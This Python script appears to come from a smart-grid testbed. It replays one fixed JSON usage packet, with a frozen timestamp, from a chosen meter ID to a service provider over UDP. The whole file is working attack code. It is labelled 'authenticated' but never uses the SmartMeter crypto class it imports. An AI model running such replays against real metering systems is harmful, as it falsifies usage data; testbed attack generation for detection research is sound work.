# attacks/replay_withAuth.py
# Authenticated Replay Attack (SM → SP)

import socket
import json
import time
import sys
import os


BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, BASE_DIR)

from crypto.sm import SmartMeter

SP_IP = "10.0.3.1"
SP_PORT = 9999
REG_PORT = 9998

REG_MAP = {
    "sm1": "10.0.1.254", "sm2": "10.0.1.254", "sm3": "10.0.1.254",
    "sm4": "10.0.1.254", "sm5": "10.0.1.254",
    "sm6": "10.0.2.254", "sm7": "10.0.2.254", "sm8": "10.0.2.254",
    "sm9": "10.0.2.254", "sm10": "10.0.2.254"
}

REPLAY_USAGE = 2.75        # constant value → replay pattern
SEND_INTERVAL = 0.5        # slow enough to avoid DoS


def run_replay(sm_id):
    if sm_id not in REG_MAP:
        print("[ERROR] Invalid SM ID")
        return

    print(" AUTHENTICATED REPLAY ATTACK STARTED]")
    print(f"[!] Compromised SM ID : {sm_id}")



    print(f"[!] Replaying usage to SP {SP_IP}:{SP_PORT}")
    print(f"[!] Constant usage value: {REPLAY_USAGE}")
    print("-" * 60)

    # ---------- REPLAY PHASE ----------
    udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Create a single packet to replay
    original_timestamp = time.time()
    original_payload = {
        "smId": sm_id,
        "usage": REPLAY_USAGE,
        "proto": "udp",
        "service": "-",
        "timestamp": original_timestamp
    }

    print(f"[ORIGINAL PACKET] {original_payload}")

    try:
        while True:
            # Replay the exact same packet with the same timestamp
            udp_sock.sendto(
                json.dumps(original_payload).encode(),
                (SP_IP, SP_PORT)
            )

            print(f"[REPLAY] usage={REPLAY_USAGE}, timestamp={original_timestamp}")
            time.sleep(SEND_INTERVAL)

    except KeyboardInterrupt:
        print("\n[!] REPLAY ATTACK STOPPED")
        udp_sock.close()


# ---------------- MAIN ----------------
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 replay_withAuth.py smX")
        sys.exit(1)

    run_replay(sys.argv[1])
